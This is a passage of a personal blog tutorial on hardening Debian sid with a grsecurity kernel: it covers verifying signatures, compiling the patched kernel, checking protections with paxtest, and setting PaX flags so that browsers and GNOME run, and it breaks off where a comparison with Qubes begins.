&lt;p&gt;Since I just set up Debian with a grsec kernel, I figured I’d write a tutorial for how to do it. It’s still a long way before the average user can take advantage of this stuff – it breaks everything, and the user needs to learn how to diagnose and fix it themselves – but I think that it’s well within the capabilities of Linux nerds who are comfortable using a terminal. You can probably also follow along no matter what Linux distribution you’re using. Also, I’m fairly new to grsecurity myself, so if you have tips or suggestions, or if I got something wrong, please post in the comments.&lt;/p&gt;
&lt;p&gt;Grsecurity can be used with very little configuration. Just by baking it into your kernel, entire classes of exploits will fail to work against you, but those same exploits will succeed against someone running a vanilla Linux kernel. Grsecurity also lets you enforce access controls, but that’s outside the scope of this article. Just running a grsec kernel gives you a lot of protection for free.&lt;/p&gt;
&lt;p&gt;First, I’m going to explain a little bit about what grsec is and how it protects you. Then I’m going to install Debian and upgrade it to sid. Then I’m going to download the Linux source code and the grsecurity patch, verify digital signatures, patch the Linux kernel, and finally compile it. (If you’ve never compiled the Linux kernel before, you’re in for a treat!) Then I’m going to show you how to use paxctl to turn off certain PaX protections on specific binaries so that they can run without crashing. And finally, I’m going to briefly show you how to troubleshoot grsec and PaX, so you can make software work that would otherwise crash, all on your own.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How does grsecurity make Linux more secure?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Memory corruption attacks normally work something like this: The target accepts malicious input into a program (maybe they load a GIF in an image viewing program, or a document in LibreOffice, or a malformed PGP public key in GnuPG). This input includes an exploit – some code that triggers a security bug in whatever software it’s targeting – as well as a small block of malicious code called shellcode. When the buggy software parses the input, the exploit takes over the flow of execution and jumps into the attacker’s shellcode. Shellcode can do many different things, but it commonly gives the attacker a remote shell – basically, letting them run commands on the victim’s computer (with the permissions of the user who was running the program that got hacked).&lt;/p&gt;
&lt;p&gt;Grsecurity protects you by being extremely strict about which parts of memory are allowed to get executed. If it sees a program try to execute some code in the wrong part of memory, it kills the process, which will thwart attacks. So if a target using a grsec-patched kernel loads a malicious PDF in a vulnerable PDF reader, and it exploits a bug and tries to jump to shellcode, grsec will kill the process and log this to &lt;code&gt;/var/log/syslog&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Unfortunately, grsec doesn’t know which programs are &lt;em&gt;supposed&lt;/em&gt; to jump into user-loaded memory – it turns out quite a few programs do. For example, web browsers are able to load websites that include JavaScript. In order to improve performance, they convert the JavaScript code to machine code and then jump into it to execute it (this is called Just In Time compilation, or JIT). When grsec notices this, it will kill your web browser process.&lt;/p&gt;
&lt;p&gt;You can still run a web browser with grsec, but you need to set a PaX flag (more on this below) to disable memory protections on that specific executable binary. This means your browser won’t immediately crash when you open it, but it also means that if an attacker is able to exploit a bug in it, they may be able to succeed in running their shellcode. Likewise, you often need to disable memory protection on programming language interpreters, such as &lt;code&gt;/usr/bin/python2&lt;/code&gt;, &lt;code&gt;/usr/bin/python3&lt;/code&gt;, and &lt;code&gt;/usr/lib/jvm/java-7-openjdk-amd64/jre/bin/java&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So it’s not perfect. But even with disabling memory protections on specific binaries, you still get a lot of protection. Most programs work fine without having to disable any protections, and grsec makes it extremely hard for an attacker to escalate privileges. So if someone does manage to hack your web browser and get a shell, grsec will probably prevent them from getting root. Or if you’re a web developer and are running Apache with an old vulnerable WordPress on it that someone on your wifi notices and hacks, grsec will probably prevent them from accessing any data that isn’t readable from the &lt;code&gt;www-data&lt;/code&gt; user, even if they come armed with Linux privilege escalation exploits.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Installing Debian sid&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Debian doesn’t release sid installation images. Instead you need to install an earlier version of Debian and upgrade to sid. So go and grab the &lt;a href="https://www.debian.org/distrib/netinst"&gt;latest stable netinst iso&lt;/a&gt;, probably the amd64 one.&lt;/p&gt;
&lt;p&gt;You also may want to verify the signature of the iso. As of this writing, the latest stable is 8.2.0, and the iso URL is &lt;code&gt;http://cdimage.debian.org/debian-cd/8.2.0/amd64/iso-cd/debian-8.2.0-amd64-netinst.iso&lt;/code&gt;. If you drop the filename part of the path and just load &lt;code&gt;http://cdimage.debian.org/debian-cd/8.2.0/amd64/iso-cd/&lt;/code&gt;, you’ll see several files to downloading, including &lt;code&gt;SHA512&lt;/code&gt; and &lt;code&gt;SHA512.sign&lt;/code&gt;. Download both of those. The &lt;code&gt;SHA512&lt;/code&gt; file contains &lt;code&gt;SHA512&lt;/code&gt; checksums of all of the isos for that version of Debian, including &lt;code&gt;debian-8.2.0-amd64-netinst.iso&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Make sure you have the key that Debian uses to sign their releases. You can &lt;a href="https://www.debian.org/CD/verify"&gt;find its fingerprint here&lt;/a&gt;. For Debian 8, the signing key fingerprint is &lt;code&gt;DF9B 9C49 EAA9 2984 3258 9D76 DA87 E80D 6294 BE9B&lt;/code&gt; (as of the time of writing), and you can get the key by running this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gpg --recv-keys DF9B9C49EAA9298432589D76DA87E80D6294BE9B
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you can verify the signature:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gpg --verify SHA512SUMS.sign                                                                                            
gpg: assuming signed data in 'SHA512SUMS'
gpg: Signature made Fri 11 Sep 2015 08:13:34 AM PDT using RSA key ID 6294BE9B
gpg: Good signature from "Debian CD signing key &amp;lt;debian-cd@lists.debian.org&amp;gt;" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF9B 9C49 EAA9 2984 3258  9D76 DA87 E80D 6294 BE9B
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Make sure it says &lt;code&gt;Good signature from "Debian CD signing key &amp;lt;debian-cd@lists.debian.org&amp;gt;"&lt;/code&gt;. Great! Now, take a SHA512 checksum of the iso (note that your checksum might be different, if you’ve downloaded a newer version of Debian than I did):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sha512sum debian-8.2.0-amd64-netinst.iso                                                                                
923cd1bfbfa62d78aecaa92d919ee54a95c8fca834b427502847228cf06155e7243875f59279b0bf6bfd1b579cbe2f1bc80528a265dafddee9a9d2a197ef3806  debian-8.2.0-amd64-netinst.iso
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let’s check to see if that checksum is in the SHA512 file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat SHA512SUMS | grep 923cd1bfbfa62d78aecaa92d919ee54a95c8fca834b427502847228cf06155e7243875f59279b0bf6bfd1b579cbe2f1bc80528a265dafddee9a9d2a197ef3806
923cd1bfbfa62d78aecaa92d919ee54a95c8fca834b427502847228cf06155e7243875f59279b0bf6bfd1b579cbe2f1bc80528a265dafddee9a9d2a197ef3806  debian-8.2.0-amd64-netinst.iso
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Great, the signed &lt;code&gt;SHA512&lt;/code&gt; file shows the same checksum for &lt;code&gt;debian-8.2.0-amd64-netinst.iso&lt;/code&gt; that I got manually. This means that I’ve confirmed that the Debian netinst iso I downloaded hasn’t been tampered with.&lt;/p&gt;
&lt;p&gt;Finally, burn the iso to a CD or &lt;code&gt;dd&lt;/code&gt; it to a USB stick, boot to it, and install Debian.&lt;/p&gt;
&lt;p&gt;Note that when it asks for you to come up with a root password, you can leave it blank. If you do this, then Debian will make your user a sudoer. This might be more familiar to you if you’re used to Ubuntu or Mac OS X.&lt;/p&gt;
&lt;p&gt;When you get to the “Partition disks” screen, choose “Guided – use entire disk and set up encrypted LVM” in order to set up full disk encryption. You’ll need to come up with a &lt;a href="https://theintercept.com/2015/03/26/passphrases-can-memorize-attackers-cant-guess/"&gt;strong passphrase&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="grsec1.png" alt="Full disk encryption"&gt;&lt;/p&gt;
&lt;p&gt;When you get to the “Software selection” screen, make sure to select GNOME as your desktop environment. That’s what I’m using, and this tutorial includes setting a PaX flag to make GNOME work.&lt;/p&gt;
&lt;p&gt;&lt;img src="grsec2.png" alt="Install GNOME desktop environment"&gt;&lt;/p&gt;
&lt;p&gt;Reboot into your freshly installed Debian, mount your encrypted hard drive, and login. Now it’s time to upgrade from stable to sid. Open a terminal and edit the /etc/apt/source.list file as root.&lt;/p&gt;
&lt;p&gt;It starts out looking like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 

# deb cdrom:[Debian GNU/Linux 8.2.0 _Jessie_ - Official amd64 NETINST Binary-1 20150906-11:09]/ jessie main

#deb cdrom:[Debian GNU/Linux 8.2.0 _Jessie_ - Official amd64 NETINST Binary-1 20150906-11:09]/ jessie main

deb http://ftp.us.debian.org/debian/ jessie main
deb-src http://ftp.us.debian.org/debian/ jessie main

deb http://security.debian.org/ jessie/updates main
deb-src http://security.debian.org/ jessie/updates main

# jessie-updates, previously known as 'volatile'
deb http://ftp.us.debian.org/debian/ jessie-updates main
deb-src http://ftp.us.debian.org/debian/ jessie-updates main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can delete the cdrom comments, and also we can delete the security and updates repositories. Since we’re updating to sid, we get all of the latest versions of all packages, which already includes security updates. And finally, change the “jessie” to “sid”, so that the result file looks like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;deb http://ftp.us.debian.org/debian/ sid main
deb-src http://ftp.us.debian.org/debian/ sid main
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Save and exit. Now, update all of the software. This will take awhile. And finally, reboot into sid.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get update
$ sudo apt-get dist-upgrade
$ sudo apt-get autoremove
$ sudo reboot
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Compiling the grsec-patched Linux kernel&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The Debian wiki’s &lt;a href="https://wiki.debian.org/grsecurity"&gt;grsecurity page&lt;/a&gt; implies that linux-grsec is packaged in sid already, but it &lt;a href="https://packages.debian.org/search?suite=sid&amp;amp;searchon=names&amp;amp;keywords=linux-grsec"&gt;doesn’t seem available&lt;/a&gt; yet. In the future this will be much simpler, but for now we can compile the Linux kernel ourselves.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Grsecurity is indeed packaged in sid. The package name (right now) is &lt;code&gt;linux-image-4.3.0-1-grsec-amd64&lt;/code&gt;, so you can apt-get install that instead of compiling it yourself if you want.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://xkcd.com/456/"&gt;&lt;img src="xkcd-cautionary.png" alt="Cautionary"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Start by installing dependencies:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get install libncurses5-dev build-essential fakeroot kernel-package gcc-5 gcc-5-plugin-dev make
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Download the public keys that are used to sign the Linux kernel source as well as the grsecurity patch. You can find the latest Linux kernel signing key &lt;a href="https://kernel.org/category/signatures.html"&gt;here&lt;/a&gt;, and you you can find the latest grsecurity signing key at the bottom of &lt;a href="https://grsecurity.net/download.php"&gt;this page&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;At the time of writing, here’s how to download the two signing keys:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gpg --recv-keys 647F28654894E3BD457199BE38DBBDC86092693E
$ gpg --recv-keys DE9452CE46F42094907F108B44D1C0F82525FE49
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now download the Linux source code and the grsecurity patch. You’re going to need to download the latest stable version (not any of the longterm versions), because the grsecurity project only releases that version publicly. Because these versions numbers change constantly, I’m not going to provide direct links.&lt;/p&gt;
&lt;p&gt;Download the latest stable Linux source, as well as the associated PGP signature file, from kernel.org. The files I’m downloading are called &lt;code&gt;linux-4.3.3.tar.xz&lt;/code&gt; and &lt;code&gt;linux-4.3.3.tar.sign&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Download the corresponding grsecurity patch, as well as the associated PGP signature file, from grsecurity.net. This will be under the header “test kernel patch”. The files I’m downloading are called &lt;code&gt;grsecurity-3.1-4.3.3-201601051958.patch&lt;/code&gt; and &lt;code&gt;grsecurity-3.1-4.3.3-201601051958.patch.sig&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;If you’re following along with a version of Linux that’s newer than 4.3.3, type the following instructions yourself instead of copying and pasting, so that the commands correspond with the version of Linux and grsec that you downloaded.&lt;/p&gt;
&lt;p&gt;Decompress the Linux source code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ unxz linux-4.3.3.tar.xz
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Verify the signatures. The output of both of these should say “Good signature”.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gpg --verify linux-4.3.3.tar.sign
$ gpg --verify grsecurity-3.1-4.3.3-201601051958.patch.sig
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If all went well, extract the Linux source code and then apply the grsec patch.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ tar -xf linux-4.3.3.tar
$ cd linux-4.3.3/
$ patch -p1 &amp;lt; ../grsecurity-3.1-4.3.3-201601051958.patch
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Start with your existing Linux kernel configuration. Note that it’s possible that your config file might be named differently if you currently have a different version of the Linux kernel installed, so make sure you use the right filename.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cp /boot/config-4.3.0-1-amd64 .config
$ make menuconfig
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Navigate to Security options, Grsecurity, and make sure it’s enabled. Then go to Configuration Method and set it to Automatic. Go to Usage Type and change it to Desktop. Go to &lt;code&gt;Virtualization Type&lt;/code&gt; and set it to None (unless you’re testing this in a VM, then make sure you choose the right hypervisor). Go to &lt;code&gt;Required Properties&lt;/code&gt; and set it to &lt;code&gt;Security&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="grsec3.png" alt="Linux kernel options"&gt;&lt;/p&gt;
&lt;p&gt;Now save and exit.&lt;/p&gt;
&lt;p&gt;You can use all of your CPU cores to make compiling the Linux kernel faster by running this.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ export CONCURRENCY_LEVEL="$(grep -c '^processor' /proc/cpuinfo)"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now compile the kernel. This will probably take a really long time. When you’re done you’ll have a deb file you can install.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ fakeroot make-kpkg --initrd kernel_image
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When this finishes, install the new Linux kernel image.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cd ..
$ sudo dpkg -i linux-image-4.3.3-grsec_4.3.3-grsec-10.00.Custom_amd64.deb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now let’s make sure you GRUB boots into this kernel image by default. Figure out what the kernel version string that GRUB will use is called.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ grep menuentry /boot/grub/grub.cfg | cut -d "'" -f2 | grep "grsec$"
Debian GNU/Linux, with Linux 4.3.3-grsec
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now edit &lt;code&gt;/etc/default/grub&lt;/code&gt; and change the &lt;code&gt;GRUB_DEFAULT=&lt;/code&gt; line be to &lt;code&gt;"Advanced options for Debian GNU\/Linux&amp;gt;&lt;/code&gt; followed by the kernel version string. Put the whole things in quotes, like this: &lt;code&gt;GRUB_DEFAULT="Advanced options for Debian GNU\/Linux&amp;gt;Debian GNU/Linux, with Linux 4.3.3-grsec"&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="grsec4.png" alt="GRUB config"&gt;&lt;/p&gt;
&lt;p&gt;Save and exit, and then upgrade grub.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo update-grub
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Before rebooting into the grsec kernel, we need to install PaX tools, which will let us disable memory protections on specific userland binaries.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get install paxtest paxctl
$ sudo reboot
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When you boot into the new kernel, everything will be broken.&lt;/p&gt;
&lt;p&gt;This is because grsec is killing the &lt;code&gt;gnome-shell&lt;/code&gt; process. In order to make your desktop environment work, you need to disable memory protections on the &lt;code&gt;gnome-shell&lt;/code&gt; binary.&lt;/p&gt;
&lt;p&gt;Press Ctrl-Alt F1 to switch to tty1 and login without graphics. Then disable memory protections on &lt;code&gt;/usr/bin/gnome-shell&lt;/code&gt; using &lt;code&gt;paxctl&lt;/code&gt; (more on how this tool works below).&lt;/p&gt;
&lt;p&gt;&lt;img src="grsec5.png" alt="Fix gnome-shell"&gt;&lt;/p&gt;
&lt;p&gt;Here’s the command to run.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo paxctl -cm /usr/bin/gnome-shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Reboot again, and this time GNOME should work.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo reboot
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Login to your account, and open a terminal to do a few final steps.&lt;/p&gt;
&lt;p&gt;Edit &lt;code&gt;/etc/sysctl.conf&lt;/code&gt; (as root) and add these lines:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kernel.grsecurity.rwxmap_logging = 0
kernel.grsecurity.grsec_lock = 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And activate them.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo sysctl -p
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, make sure that grsecurity is really working like it should.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ paxtest blackhat
PaXtest - Copyright(c) 2003,2004 by Peter Busser 
Released under the GNU Public Licence version 2 or later

Writing output to /home/micah/paxtest.log
It may take a while for the tests to complete
Test results:
PaXtest - Copyright(c) 2003,2004 by Peter Busser 
Released under the GNU Public Licence version 2 or later

Mode: Blackhat
Linux rey 4.3.3-grsec #3 SMP Mon Jan 11 12:42:40 PST 2016 x86_64 GNU/Linux

Executable anonymous mapping             : Killed
Executable bss                           : Killed
Executable data                          : Killed
Executable heap                          : Killed
Executable stack                         : Killed
Executable shared library bss            : Killed
Executable shared library data           : Killed
Executable anonymous mapping (mprotect)  : Killed
Executable bss (mprotect)                : Killed
Executable data (mprotect)               : Killed
Executable heap (mprotect)               : Killed
Executable stack (mprotect)              : Killed
Executable shared library bss (mprotect) : Killed
Executable shared library data (mprotect): Killed
Writable text segments                   : Killed
Anonymous mapping randomisation test     : 28 bits (guessed)
Heap randomisation test (ET_EXEC)        : 23 bits (guessed)
Heap randomisation test (PIE)            : 35 bits (guessed)
Main executable randomisation (ET_EXEC)  : 28 bits (guessed)
Main executable randomisation (PIE)      : 28 bits (guessed)
Shared library randomisation test        : 28 bits (guessed)
Stack randomisation test (SEGMEXEC)      : 35 bits (guessed)
Stack randomisation test (PAGEEXEC)      : 35 bits (guessed)
Arg/env randomisation test (SEGMEXEC)    : 39 bits (guessed)
Arg/env randomisation test (PAGEEXEC)    : 39 bits (guessed)
Randomization under memory exhaustion @~0: 29 bits (guessed)
Randomization under memory exhaustion @0 : 28 bits (guessed)
Return to function (strcpy)              : paxtest: return address contains a NULL byte.
Return to function (memcpy)              : Killed
Return to function (strcpy, PIE)         : paxtest: return address contains a NULL byte.
Return to function (memcpy, PIE)         : Killed
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Congratulations, you’re running Debian with a hardened grsecurity kernel! But you’re not done yet. Lots of your software is going to crash as soon as your run it. The next section shows you how to fix that.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Thanks to the Kevin Gallagher and the &lt;a href="https://freedom.press/"&gt;Freedom of the Press Foundation&lt;/a&gt; staff for making a great &lt;a href="https://gist.github.com/ageis/a91f36ca99c252291a00"&gt;guide&lt;/a&gt; that I mostly based this section off of.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Setting PaX flags so you can actually use your computer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Grsecurity automatically kills processes that use memory in a way that could be an attack. But many programs legitimately use memory this way. In order to use those programs, you need to set PaX flags on their binaries — these flags actually get stored in the binary file’s header. &lt;code&gt;paxctl&lt;/code&gt; is a program that lets you view and set these flags.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo paxctl -h
PaX control v0.9
Copyright 2004,2005,2006,2007,2009,2010,2011,2012,2014 PaX Team 

usage: paxctl  

options:
    -p: disable PAGEEXEC        -P: enable PAGEEXEC
    -e: disable EMUTRAMP        -E: enable EMUTRAMP
    -m: disable MPROTECT        -M: enable MPROTECT
    -r: disable RANDMMAP        -R: enable RANDMMAP
    -x: disable RANDEXEC        -X: enable RANDEXEC
    -s: disable SEGMEXEC        -S: enable SEGMEXEC

    -v: view flags          -z: restore default flags
    -q: suppress error messages -Q: report flags in short format
    -c: convert PT_GNU_STACK into PT_PAX_FLAGS (see manpage!)
    -C: create PT_PAX_FLAGS (see manpage!)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Earlier we ran &lt;code&gt;paxctl -cm /usr/bin/gnome-shell&lt;/code&gt;. The &lt;code&gt;-c&lt;/code&gt; modified the binary so that it’s able to accept PaX flags, and the &lt;code&gt;-m&lt;/code&gt; disabled &lt;code&gt;MPROTECT&lt;/code&gt; — basically meaning that that specific binary is allowed to do stuff that grsec would kill other binaries it caught doing. You can view the flags that are set like this.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo paxctl -v /usr/bin/gnome-shell                                        
PaX control v0.9
Copyright 2004,2005,2006,2007,2009,2010,2011,2012,2014 PaX Team 

- PaX flags: -----m-x-e-- [/usr/bin/gnome-shell]
    MPROTECT is disabled
    RANDEXEC is disabled
    EMUTRAMP is disabled
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For the most part, all you’ll ever need to do is use &lt;code&gt;paxctl -cm&lt;/code&gt; on a binary that you trust to run without &lt;code&gt;MPROTECT&lt;/code&gt;. You can always run &lt;code&gt;paxctl -M&lt;/code&gt; to enable &lt;code&gt;MPROTECT&lt;/code&gt; on it again.&lt;/p&gt;
&lt;p&gt;There’s also a cool looking project called &lt;a href="https://github.com/subgraph/paxrat"&gt;paxrat&lt;/a&gt;, developed by Subgraph, that helps you manage PaX flags. It’s not yet packaged for Debian, and I haven’t yet tested it out, but I look forward to playing with it. For now we can just use paxctl.&lt;/p&gt;
&lt;p&gt;To start, let’s set PaX flags for some GRUB binaries.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo paxctl -cpm /usr/sbin/grub-probe
$ sudo paxctl -cpm /usr/sbin/grub-mkdevicemap
$ sudo paxctl -cpm /usr/sbin/grub-install
$ sudo paxctl -cpm /usr/bin/grub-script-check
$ sudo paxctl -cpm /usr/bin/grub-mount
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And python interpreters.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo paxctl -cm /usr/bin/python2
$ sudo paxctl -cm /usr/bin/python3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;One issue I’ve run into when trying to set PaX flags with &lt;code&gt;paxctl&lt;/code&gt; is an error message that says “Text file busy”. If you run into this issue, you can kill any processes of that binary that are running and then try again. If you have a hard time keeping a process killed, you might try rebooting into recovery mode to set its PaX flags.&lt;/p&gt;
&lt;p&gt;How do you know what binaries you should set PaX flags on? Grsec logs its error messages to &lt;code&gt;/var/log/syslog&lt;/code&gt;, so let’s start by opening a new terminal and watching all of the grsec error messages that scroll by.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo tail -f /var/log/syslog | grep grsec
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, in a new terminal window, try opening Iceweasel by running its binary.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ iceweasel
Gtk-Message: Failed to load module "canberra-gtk-module"
Killed
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Iceweasel was killed by grsec, and here’s the error message that was logged to &lt;code&gt;/var/log/syslog&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Jan 11 18:18:25 debian kernel: [  286.128581] grsec: denied resource by requesting 4096 for RLIMIT_CORE against limit 0 for /usr/lib/iceweasel/iceweasel[iceweasel:1991] uuid/euid:1000/1000 gid:egid:1000/1000, parent /bin/bash[1417] uid/euid:1000/1000 gid/egid:1000/1000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The important bits there are grsec: &lt;code&gt;denied resource and /usr/lib/iceweasel/iceweasel&lt;/code&gt;. (Note that &lt;code&gt;/usr/bin/iceweasel&lt;/code&gt; is a symlink to &lt;code&gt;/usr/lib/iceweasel/iceweasel&lt;/code&gt;, so this is in fact the Iceweasel binary.)&lt;/p&gt;
&lt;p&gt;If you want to use Iceweasel (and risk turning off its memory protections), then use paxctl to disable &lt;code&gt;MPROTECT&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo paxctl -cm /usr/lib/iceweasel/iceweasel
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now trying running iceweasel again. It should just open this time!&lt;/p&gt;
&lt;p&gt;Now, try opening a new tab. My syslog window throws two more errors.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Jan 11 18:26:48 debian kernel: [  788.651798] grsec: denied resource overstep by requesting 4096 for RLIMIT_CORE against limit 0 for /usr/lib/iceweasel/plugin-container[Web Content:2100] uid/euid:1000/1000 gid/egid:1000/1000, parent /usr/lib/iceweasel/iceweasel[Gecko_IOThread:2041] uid/euid:1000/1000 gid/egid:1000/1000
Jan 11 18:26:48 debian kernel: [  788.818013] grsec: denied resource overstep by requesting 4096 for RLIMIT_CORE against limit 0 for /usr/lib/iceweasel/plugin-container[Web Content:2114] uid/euid:1000/1000 gid/egid:1000/1000, parent /usr/lib/iceweasel/iceweasel[Gecko_IOThread:2041] uid/euid:1000/1000 gid/egid:1000/1000
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It looks like each time you open a tab, Iceweasel tries running &lt;code&gt;/usr/lib/iceweasel/plugin-container&lt;/code&gt; in a subprocess, and grsec kills that process. However, Iceweasel appears to work fine without it, so no big deal. Since it hasn’t affected me yet, I’m going to keep &lt;code&gt;MPROTECT&lt;/code&gt; enabled on that binary. If you need to run a plugin in Iceweasel and grsec prevents that from working, then you might consider disabling &lt;code&gt;MPROTECT&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let’s try another: Tor Browser. The easiest way to install Tor Browser is to use &lt;a href="https://github.com/micahflee/torbrowser-launcher"&gt;Tor Browser Launcher&lt;/a&gt; (a piece of software I wrote… ehem.)&lt;/p&gt;
&lt;p&gt;Edit &lt;code&gt;/etc/apt/sources.list&lt;/code&gt; as root, add the “contrib” repository.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;deb http://ftp.us.debian.org/debian/ sid main contrib
deb-src http://ftp.us.debian.org/debian/ sid main contrib
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now install Tor Browser Launcher.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo apt-get update
$ sudo apt-get install torbrowser-launcher
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now try launching Tor Browser.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ torbrowser-launcher
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It should pop up a window and download the Tor Browser tarball for the first time. It should also download its PGP signature, verify the signature, extract the tarball, and then try to launch Tor Browser. But when it does, grsec kills the process.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Jan 11 18:38:24 debian kernel: [ 1485.423982] grsec: denied resource overstep by requesting 4096 for RLIMIT_CORE against limit 0 for /home/micah/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/Browser/firefox[firefox:3954] uid/euid:1000/1000 gid/egid:1000/1000, parent /lib/systemd/systemd[systemd:1] uid/euid:0/0 gid/egid:0/0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tor Browser is trying to run the &lt;code&gt;/home/micah/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/Browser/firefox&lt;/code&gt; binary, and it fails for the exact same reason that Iceweasel fails. To fix it, disable &lt;code&gt;MPROTECT&lt;/code&gt; on that binary.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ sudo paxctl -cm /home/micah/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/Browser/firefox
$ torbrowser-launcher
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This time, Tor Browser will launch without any crashes or grsec errors.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;How does Debian with grsecurity compare to Qubes?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I’ve &lt;a href="https://micahflee.com/2014/04/the-operating-system-that-can-protect-you-even-if-you-get-hacked/"&gt;written in the past&lt;/a&gt; about how awesome &lt;a href="https://www.qubes-os.org/"&gt;Qubes&lt;/a&gt; is, which is also a reasonably secure operating system. So how does it compare to Debian with a grsec kernel?&lt;/p&gt;
